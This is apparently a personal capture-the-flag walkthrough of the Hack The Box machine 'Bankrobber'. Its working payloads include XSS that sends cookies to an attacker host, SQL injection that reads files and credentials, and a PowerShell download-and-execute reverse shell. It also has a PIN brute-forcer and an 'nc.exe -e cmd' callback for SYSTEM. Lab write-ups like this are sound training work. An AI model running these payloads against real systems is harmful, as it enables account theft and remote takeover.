@@ -1,0 +1,760 @@
+Bankrobber - Hack The Box - Windows Insane - CSS, SQL Injection, CSRF Attack, Chisel 
+
+Lots of cross site scripting, steal admin cookies, search sql injectable, light fuzzing
+
+
+Port 80, 443, 3306, 445
+
+Web Server running apache on windows installed xampp. Free and open source web source solution. Installs apache php mariadb.
+instead in c:\inetpub\htdocs -> c:\xampp\htdocs, rpibably .php and not .asp or aspx
+
+You can view the certificate and see if it leaks any information. Nothing much revealed, mysql is revealed.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber/nmap]
+└──╼ $crackmapexec smb 10.10.10.154
+SMB         10.10.10.154    445    BANKROBBER       [*] Windows 10 Pro 14393 (name:BANKROBBER) (domain:Bankrobber) (signing:False) (SMBv1:True)
+===================================================================================================================================
+
+Poke for anonymous shares.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber/nmap]
+└──╼ $smbclient -L 10.10.10.154 -U '' -N
+session setup failed: NT_STATUS_ACCESS_DENIED
+===================================================================================================================================
+
+https://10.10.10.154/index.php
+
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber/nmap]
+└──╼ $gobuster dir -x php -u http://10.10.10.154 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-root
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+https://10.10.10.154/index.php?msg=User%20created.
+===================================================================================================================================
+
+We could possibly test for reflective cross site scripting.
+Commands and Output:
+===================================================================================================================================
+https://10.10.10.154/index.php?msg=<b>User%20created.</b>
+===================================================================================================================================
+Actual carrots are in html entity form if looking at source code.
+Creds: hacker hackme
+If the user created message came back in bold then we would have the reflective vulnerability working.
+
+Hit F12 for bringing web developer console.
+
+We get a reply back saying that an admin will review the transaction once the user submits an ecoin transfer.
+
+We will now create a cross site scripting entry
+Commands and Output:
+===================================================================================================================================
+<img src=http://10.10.14.10/hithere.jpg />
+===================================================================================================================================
+
+And after a while we get a hit back after setting our netcat listener
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $sudo !!
+sudo nc -lnvp 80
+[sudo] password for user: 
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.154.
+Ncat: Connection from 10.10.10.154:49760.
+GET /hithere.jpg HTTP/1.1
+Referer: http://localhost/admin/index.php
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Accept: */*
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,*
+Host: 10.10.14.10
+
+===================================================================================================================================
+
+We are going to check how the cookies are stored since that will tell us how to construct our payload.
+Hit f12 go to storage
+Look at cookies and password is base 64, http only is set to false.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $echo aGFja21l | base64 -d
+hackme
+===================================================================================================================================
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+We can try the following payload 
+Commands and Output:
+===================================================================================================================================
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+===================================================================================================================================
+
+If you are having troubles doing the transfer disable active portal by going to "about:config"
+Type in portal and make the boolean false
+
+Now we send the previous payload. we get the following back.
+
+Commands and Output:
+===================================================================================================================================
+POST /user/transfer.php HTTP/1.1
+Host: 10.10.10.154
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 123
+Origin: http://10.10.10.154
+DNT: 1
+Connection: close
+Referer: http://10.10.10.154/user/
+Cookie: id=3; username=aGFja2Vy; password=aGFja21l
+Sec-GPC: 1
+
+
+fromId=3&toId=1&amount=1&comment=<script>document.location='http://localhost/XSS/grabber.php?c='%2bdocument.cookie</script>
+===================================================================================================================================
+
+New request body replacement
+Commands and Output:
+===================================================================================================================================
+<script>document.location='http://10.10.14.10/?c='+btoa(document.cookie)</script>
+===================================================================================================================================
+
+If the payload above does not work, than we can try the following:
+from XSS in HTML/Applications Common Payloads
+Commands and Output:
+===================================================================================================================================
+<img src=x onerror=this.src="http://10.10.14.10/?cookie="+btoa(document.cookie) />
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+POST /user/transfer.php HTTP/1.1
+Host: 10.10.10.154
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 129
+Origin: http://10.10.10.154
+DNT: 1
+Connection: close
+Referer: http://10.10.10.154/user/
+Cookie: id=3; username=aGFja2Vy; password=aGFja21l
+Sec-GPC: 1
+
+
+fromId=3&toId=1&amount=1&comment=<img+src%3dx+onerror%3dthis.src%3d"http%3a//10.10.14.10/%3fcookie%3d"%2bbtoa(document.cookie)+/>
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $sudo !! 80
+sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+ 10.10.10.154 - - [26/Apr/2021 12:51:17] "GET /?cookie=dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ== HTTP/1.1" 200 -
+===================================================================================================================================
+
+The response from the payload is a base64 string which we can decode
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $echo -n "dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ==" | base64 -d
+username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D; id=1
+===================================================================================================================================
+
+The usernames and passwords are also base64 as well.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $echo -n YWRtaW4 | base64 -d
+adminbase64: invalid input
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $echo -n SG9wZWxlc3Nyb21hbnRpYw== | base64 -d
+Hopelessromantic
+===================================================================================================================================
+
+We can now login with the credentials obtained from the admin user.
+We can apparently use Backdoorchecker which allows to use the dir command with any arguments but is only allowd from LOCALHOST
+
+This is all coming from backdoorchecker.php
+/admin/backdoorchecker
+
+There is also a search.php which allows us to enter ids in the prompt and get back a user,
+admin/search.php
+
+it  appears to have a sql injection point by testing it with a comment after issuing the following
+Commands and Output:
+===================================================================================================================================
+2' -- -
+===================================================================================================================================
+
+Let's get a legitimate query and run sql map in the background.
+We can test the query by using an "order by" to identify how many columns it is extracting.
+COMMANDS AND OUTPUT:
+=====================================================================================================================================
+POST /admin/search.php HTTP/1.1
+Host: 10.10.10.154
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 31
+Origin: http://10.10.10.154
+DNT: 1
+Connection: close
+Referer: http://10.10.10.154/admin/
+Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
+Sec-GPC: 1
+
+term=1'+order+by+1+--+-
+=====================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+term=1'+order+by+1+--+-
+term=1'+order+by+2+--+-
+term=1'+order+by+3+--+-
+term=1'+order+by+4+--+-
+===================================================================================================================================
+
+We get an error at 4. Meaning 3 is the highest number that worked there will be only 3 columns. We can further test this with union
+Commands and Output:
+===================================================================================================================================
+term=1'+union+select+1,2,3+--+-
+
+if we did 1,2 only we get an error
+===================================================================================================================================
+
+We will try the following sqlmap query.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $sqlmap -r search.req --dbms mysql --technique=U --batch --dump
+===================================================================================================================================
+
+We can also dump the databse users and passwords
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $sqlmap -r search.req --dbms mysql --technique=U --users
+..
+..
+..
+database management system users [5]:
+[*] ''@'localhost'
+[*] 'pma'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'::1'
+[*] 'root'@'localhost'
+
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $sqlmap -r search.req --dbms mysql --technique=U --passwords
+...
+...
+..
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
+database management system users password hashes:
+[*] pma [1]:
+    password hash: NULL
+[*] root [1]:
+    password hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
+..
+..
+===================================================================================================================================
+
+root:F435725A173757E57BD36B09048B8B610FF4D0C4
+
+To get the info manually you can do the following queries.
+
+Commands and Output:
+===================================================================================================================================
+term=1'+union+select+1,user(),3+--+-
+..
+..
+..
+root@localhost
+
+..
+..
+..
+term=1'+union+select+1,system_user(),3+--+-
+..
+..
+..
+root@localhost
+..
+..
+..
+
+===================================================================================================================================
+
+
+Mysql also supports reading files
+Commands and Output:
+===================================================================================================================================
+term=1'+union+select+1,LOAD_FILE('C:/Windows/System32/license.rtf'),3+--+-
+===================================================================================================================================
+
+We can also check where the data directory is with the following:
+Commands and Output:
+===================================================================================================================================
+term=1'+union+select+1,@@datadir,3+--+-
+
+..
+..
+..
+C:\xampp\mysql\data\
+
+..
+..
+===================================================================================================================================
+
+We can now use this to possibly get the backdooorcheccker file and check the contents to see if we can bypass the dir restrictions
+Commands and Output:
+===================================================================================================================================
+term=1'+union+select+1,LOAD_FILE('C:/xampp/htdocs/admin/backdoorchecker.php'),3+--+-
+===================================================================================================================================
+
+We copy and place the output in ~/htb/bankrobber/admin/backdoorchecker.php
+
+Based on the output the php looks at another page to see who can run commands in the auth.php page
+Commands and Output:
+===================================================================================================================================
+term=1'+union+select+1,LOAD_FILE('C:/xampp/htdocs/admin/auth.php'),3+--+-
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+term=1'+union+select+1,LOAD_FILE('C:/xampp/htdocs/link.php'),3+--+-
+
+..
+..
+<?php
+
+$user = 'root';
+
+$pass = 'Welkom1!';
+
+$dsn = "mysql:host=127.0.0.1;dbname=bankrobber;";
+
+
+
+$pdo = new PDO($dsn,$user,$pass);
+
+
+
+function echoBalance($pdo){
+
+	$pdo = $pdo;
+
+	if(isset($_COOKIE['id'])){
+
+		$stmt = $pdo->prepare("SELECT amount FROM balance where userId = ?");
+
+		$stmt->execute([$_COOKIE['id']]);
+
+
+
+		while($row = $stmt->fetch()){
+
+			return $row[0];
+
+		}
+
+	}
+
+}
+
+?>
+..
+..
+..
+===================================================================================================================================
+
+We even find the root creds that were previously found in its hashed form here in palin text
+root:Welkom1
+If we can read the code we find that you can bypass the filters given that there is insufficent character checking in backdoor
+
+Commands and Output:
+===================================================================================================================================
+$bad      = array('$(','&');
+foreach($bad as $char){
+          if(strpos($_POST['cmd'],$char) !== false){
+                die("You're not allowed to do that.");
+===================================================================================================================================
+
+If on linux you could bypass by using "`" backticks and "||" to execute things.
+
+We can issue commands as long as the first part of the string is dir and does not include the bad characters.
+
+We are going to create a javascript set of commands to have the user execute on the localhost and get code execution.
+If we reload we will see the request is waiting to be approved in the admin window, so we just wait patiently.
+
+Commands and Output:
+===================================================================================================================================
+..
+..
+var xhr = new XMLHttpRequest();
+var url = "http://localhost/admin/backdoorchecker.php";
+//var params = "cmd=dir | powershell -exec bypass -f \\\\10.10.14.10\\nishang.ps1";
+var params = "cmd=dir | powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/nishang.ps1')";
+xhr.open("POST", url);
+xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
+xhr.withCredentials = true;
+xhr.send(params);
+..
+..
+fromId=3&toId=1&amount=1&comment=<script+src%3dhttp%3a//10.10.14.10/testing.js></script>
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/bankrobber/www]
+└──╼ $sudo python3 -m http.server 80
+[sudo] password for user: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.154 - - [26/Apr/2021 14:27:17] "GET /testing.js HTTP/1.1" 200 -
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/bankrobber/www]
+└──╼ $sudo tcpdump -i tun0 icmp
+[sudo] password for user: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+14:27:17.695431 IP 10.10.10.154 > 10.10.14.10: ICMP echo request, id 1, seq 1, length 40
+14:27:17.695503 IP 10.10.14.10 > 10.10.10.154: ICMP echo reply, id 1, seq 1, length 40
+===================================================================================================================================
+
+Now we can attempt to create a reverse shell payload.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber/www]
+└──╼ $cat testing.js 
+var xhr = new XMLHttpRequest();
+var url = "http://localhost/admin/backdoorchecker.php";
+var params = "cmd=dir | powershell -exec bypass -f \\\\10.10.14.10\\nishang.ps1";
+xhr.open("POST", url);
+xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
+xhr.withCredentials = true;
+xhr.send(params);
+
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/bankrobber/www]
+└──╼ $sudo python3 -m http.server 80
+[sudo] password for user: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.154 - - [26/Apr/2021 17:39:17] "GET /testing.js HTTP/1.1" 200 -
+..
+..
+..
+
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber/www]
+└──╼ $sudo impacket-smbserver testme $(pwd) -smb2support
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.154,50730)
+[*] AUTHENTICATE_MESSAGE (BANKROBBER\Cortin,BANKROBBER)
+[*] User BANKROBBER\Cortin authenticated successfully
+[*] Cortin::BANKROBBER:aaaaaaaaaaaaaaaa:3034a9cc4746cc3dedbbb549fb8caa9e:0101000000000000802802c1fd3ad7013b3c69a929fb3a2c0000000001001000410050004500440065004e0065006e0003001000410050004500440065004e0065006e00020010006b0054006f0079006400490055005700040010006b0054006f007900640049005500570007000800802802c1fd3ad70106000400020000000800300030000000000000000000000000200000da4fb68f2426cf63ace3396985cd6b0e5b4afdd0589b6babc1b2d0313655a8bf0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003000000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:testme)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:testme)
+[*] Closing down connection (10.10.10.154,50730)
+[*] Remaining connections []
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/bankrobber/www]
+└──╼ $rlwrap nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.154] 50733
+Windows PowerShell running as user Cortin on BANKROBBER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+bankrobber\cortin
+PS C:\xampp\htdocs\admin>
+
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name         SID                                           
+================= ==============================================
+bankrobber\cortin S-1-5-21-2969120486-4178414442-4202251737-1000
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes                                        
+=========================================== ================ ============ ==================================================
+Iedereen                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+INGEBOUWD\Gebruikers                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\BATCH                          Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
+AANMELDEN OP DE CONSOLE                     Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Geverifieerde gebruikers       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Deze organisatie               Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Lokaal account                 Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOKAAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM-verificatie               Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Verplicht niveau\Gemiddeld verplicht niveau Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                           State   
+============================= ===================================== ========
+SeShutdownPrivilege           Systeem afsluiten                     Disabled
+SeChangeNotifyPrivilege       Controle op bladeren negeren          Enabled 
+SeUndockPrivilege             Computer uit basisstation verwijderen Disabled
+SeIncreaseWorkingSetPrivilege Een proceswerkset vergroten           Disabled
+SeTimeZonePrivilege           Tijdzone wijzigen                     Disabled
+===================================================================================================================================
+
+If we had the SEImpersonator token we could use juicy potatoe.
+OS is also in dutch.
+
+Commands and Output:
+===================================================================================================================================
+PS C:\xampp\htdocs\admin> 
+net use z: \\10.10.14.10\testme
+De opdracht is voltooid.
+
+===================================================================================================================================
+
+Running netstat we see an interesting port we can't access directly so we will use chisel to forward it to us.
+Commands and Output:
+===================================================================================================================================
+netstat -an
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
+===================================================================================================================================
+
+Port 910, will use chisel for port redirection
+Commands and Output:
+===================================================================================================================================
+SERVER:
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $sudo !!
+sudo ./chisel server --port 9002 --reverse 
+[sudo] password for user: 
+2021/04/26 18:26:09 server: Reverse tunnelling enabled
+2021/04/26 18:26:09 server: Fingerprint 68:d2:38:a1:fc:77:7b:36:d1:d6:11:4b:c4:e5:1a:23
+2021/04/26 18:26:09 server: Listening on 0.0.0.0:9002...
+2021/04/26 18:26:46 server: proxy#1:R:0.0.0.0:910=>127.0.0.1:910: Listening
+
+..
+..
+..
+CLIENT:
+./chisel.exe client 10.10.14.10:9002 R:910:127.0.0.1:910
+
+===================================================================================================================================
+
+Open a new reverse shell session since your current one will be held by the chisel client.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $nc localhost 910
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio & Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+ [$] 1234
+ [!] Access denied, disconnecting client....
+===================================================================================================================================
+
+Brute force maybe necessary. We use pwntools to remotely enter the pin.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $cat brute.py 
+from pwn import *
+for i in range(0,9999):
+    code = str(i).zfill(4)
+    r = remote("localhost",910)
+    r.recvuntil("[$] ")
+    r.sendline(code)
+    response = r.recvline()
+    r.close()
+    if b"Access denied" not in response:
+        print(code)
+        break
+===================================================================================================================================
+
+Now we can execute and get the pin.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $python brute.py 
+[+] Opening connection to localhost on port 910: Done
+[*] Closed connection to localhost port 910
+[+] Opening connection to localhost on port 910: Done
+[+] Opening connection to localhost on port 910: Done
+[*] Closed connection to localhost port 910
+..
+..
+..
+[+] Opening connection to localhost on port 910: Done
+[*] Closed connection to localhost port 910
+[+] Opening connection to localhost on port 910: Done
+[*] Closed connection to localhost port 910
+0021
+===================================================================================================================================
+
+Apparently the program asks us for input so since it is most likley a buffer overfow we can generate a pattern and give it to the
+application.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $/usr/bin/msf-pattern_create -l 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $nc localhost 910
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio & Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+ [$] 0021
+ [$] PIN is correct, access granted!
+ --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+ [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+ [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A using our e-coin transfer application. 
+ [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+ [$] Transaction in progress, you can safely disconnect...
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $/usr/bin/msf-pattern_offset -q 0Ab1 -l 100
+[*] Exact match at offset 32
+===================================================================================================================================
+
+We find the offset at 32. After the 32 bytes it can execute any program it has specified, to get system simply copy netcat over
+and execute from the box.
+Commands and Output:
+===================================================================================================================================
+└──╼ $nc localhost 910
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio & Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+ [$] 0021
+ [$] PIN is correct, access granted!
+ --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+ [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\Desktop\nc.exe -e cmd 10.10.14.10 9003
+ [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\Desktop\nc.exe -e cmd 10.10.14.10 9003 using our e-coin transfer application. 
+ [$] Executing e-coin transfer tool: C:\Users\Cortin\Desktop\nc.exe -e cmd 10.10.14.10 9003
+
+ [$] Transaction in progress, you can safely disconnect...
+===================================================================================================================================
+
+And we get system.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/bankrobber]
+└──╼ $nc -lnvp 9003
+listening on [any] 9003 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.154] 51057
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
